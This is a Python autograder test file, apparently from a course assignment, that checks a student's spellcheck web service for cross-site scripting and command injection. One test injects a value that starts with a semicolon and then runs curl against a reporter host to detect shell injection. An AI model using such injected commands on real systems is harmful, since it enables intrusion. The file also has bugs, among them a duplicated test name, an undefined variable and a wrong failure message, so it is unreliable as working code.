import asyncio
import time
import unittest
import requests

from gradescope_utils.autograder_utils.decorators import weight, visibility

from utils import *
from xssbot import *
from config import SERVICE_ADDR


class WebFixture(unittest.TestCase):
    def SetUp(self):
        pass

    @weight(1)
    def test_spellcheck_xss(self):
        uname = "xss_test"
        pword = "password"
        twofactor = "1234567890"
        s = initSession(uname, pword, twofactor)

        spellcheck_exploit = lambda payload: spellcheck(
            payload, uname, password, twofactor, s
        )

        sid = "xss_test"
        asyncio.ensure_future(
            inquisition(spellcheck_exploit, "%s/spellcheck" % (SERVICE_ADDR), sid, s)
        )
        time.sleep(1)
        report = fetch_report(sid)

        # Check if callback report is empty
        self.assertFalse(bool(report), "There is XSS in your code")

    @weight(1)
    def test_spellcheck_xss(self):
        sid = "1"
        tid = "cmdinj"
        cmdinj = "; curl %s/grade?sid=%s&tid=%s" % (REPORTER_ADDR, sid, tid)
        uname = "cmdinj_test"
        pword = "password"
        twofactor = "1234567890"
        spellcheck(cmdinj, uname, pword, twofactor)

        time.sleep(1)

        report = fetch_report(sid)

        # Check if callback report is empty
        self.assertFalse(bool(report), "There is XSS in your code")
